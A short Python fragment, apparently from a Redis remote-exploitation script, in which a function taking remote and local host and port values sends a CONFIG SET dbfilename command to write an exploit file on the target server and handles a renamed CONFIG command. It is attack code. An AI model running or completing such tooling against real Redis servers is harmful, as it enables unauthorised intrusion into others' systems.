...
def runserver(rhost, rport, lhost, lport):
    ...
    try:
        ...
        rec_buf = remote.do("{} SET dbfilename {}".format(config, expfile))
        if "-ERR unknown command" in rec_buf:
            print("\033[1;31;m[-]\033[0m {}.".format(rec_buf.strip()))
            print("\033[1;31;m[-]\033[0m Need CONFIG name.")
            return
        printback(remote)
        sleep(2)
